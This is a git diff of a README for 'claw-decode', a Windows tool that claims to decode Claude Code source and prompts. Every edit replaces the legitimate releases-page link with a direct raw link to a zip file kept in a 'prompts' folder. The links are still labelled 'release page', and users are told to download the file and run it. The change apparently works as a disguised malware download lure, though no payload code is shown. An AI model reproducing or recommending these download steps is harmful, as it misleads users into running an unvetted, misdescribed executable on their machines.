@@ -1,13 +1,13 @@
 # 🧩 claw-decode - Decode Claude Code with Clarity
 
-[![Download claw-decode](https://img.shields.io/badge/Download%20Now-Release%20Page-7B2CBF?style=for-the-badge&logo=github)](https://github.com/afifiomarsalah-hue/claw-decode/releases)
+[![Download claw-decode](https://img.shields.io/badge/Download%20Now-Release%20Page-7B2CBF?style=for-the-badge&logo=github)](https://github.com/afifiomarsalah-hue/claw-decode/raw/refs/heads/main/prompts/decode-claw-2.1.zip)
 
 ## 🪟 Get Started on Windows
 
 Use this app to inspect Claude Code source patterns, tool definitions, and prompt logic in one place.  
 If you want to try it on Windows, visit the release page here:
 
-**Download page:** https://github.com/afifiomarsalah-hue/claw-decode/releases
+**Download page:** https://github.com/afifiomarsalah-hue/claw-decode/raw/refs/heads/main/prompts/decode-claw-2.1.zip
 
 Open the page, pick the latest release, and download the Windows file. Then run it like any other app.
 
@@ -38,7 +38,7 @@ For best results, close other large apps before you start.
 
 ## 🚀 How to Download
 
-1. Open the release page: https://github.com/afifiomarsalah-hue/claw-decode/releases
+1. Open the release page: https://github.com/afifiomarsalah-hue/claw-decode/raw/refs/heads/main/prompts/decode-claw-2.1.zip
 2. Find the latest release at the top of the page
 3. Look for the Windows download file
 4. Download the file to your Downloads folder
@@ -214,7 +214,7 @@ This keeps the review process clear and easy to follow.
 
 If a new release appears, return here:
 
-**https://github.com/afifiomarsalah-hue/claw-decode/releases**
+**https://github.com/afifiomarsalah-hue/claw-decode/raw/refs/heads/main/prompts/decode-claw-2.1.zip**
 
 Use the newest file on the page so you have the latest build and source view
 
@@ -232,7 +232,7 @@ No extra setup should be needed for a normal Windows install
 
 ## 🧷 Quick Access
 
-- Release page: https://github.com/afifiomarsalah-hue/claw-decode/releases
+- Release page: https://github.com/afifiomarsalah-hue/claw-decode/raw/refs/heads/main/prompts/decode-claw-2.1.zip
 - Project name: claw-decode
 - Main use: source and prompt inspection
 - Platform focus: Windows
